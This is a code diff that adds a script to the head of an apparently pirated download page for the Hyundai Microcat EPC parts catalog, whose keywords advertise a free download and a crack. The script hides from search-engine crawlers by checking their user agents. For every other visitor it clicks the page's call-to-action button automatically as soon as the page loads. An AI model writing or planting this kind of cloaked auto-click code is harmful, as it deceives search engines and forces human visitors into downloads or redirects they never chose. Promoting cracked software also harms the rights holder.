@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hyundai Microcat EPC v6 07.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Hyundai Microcat EPC v6 07.2024 for comprehensive Hyundai parts catalog with VIN and part number search, compatible with Windows 10 (64 bit).">
     <meta name="keywords" content="Hyundai Microcat EPC v6 07.2024, Hyundai Microcat EPC, Hyundai Microcat EPC v6, Hyundai Microcat EPC 2024, Hyundai Microcat EPC download, Hyundai Microcat EPC free download, Microcat Hyundai EPC v6 2024, Hyundai Microcat EPC v6 2024 free download, Hyundai Microcat EPC latest version, Microcat Hyundai download, Hyundai parts catalog software, Hyundai vehicle parts catalog, Hyundai Genesis spare parts, Hyundai Genesis accessories catalog, Microcat Hyundai EPC download free, Hyundai Microcat EPC crack, Hyundai parts catalog 2024, Hyundai EPC Windows 10, Hyundai EPC multilingual, Hyundai EPC 64 bit, Hyundai EPC VIN search, Hyundai EPC part number search, Hyundai EPC software, Hyundai Microcat EPC v6 07.2024 скачать бесплатно, Hyundai Microcat EPC 2024 скачать, Hyundai Microcat EPC v6 скачать бесплатно, Hyundai Microcat каталог деталей скачать, Hyundai запчасти каталог скачать, Hyundai Microcat каталог запчастей скачать бесплатно, Hyundai Microcat каталог деталей 2024 скачать, Hyundai Microcat EPC v6 07.2024 безкоштовно завантажити, Hyundai Microcat EPC 2024 завантажити, Hyundai Microcat EPC v6 завантажити безкоштовно, Hyundai Microcat каталог деталей завантажити, Hyundai запчастини каталог завантажити, Hyundai Microcat каталог запчастин завантажити безкоштовно, Hyundai Microcat каталог деталей 2024 завантажити">
     <style>
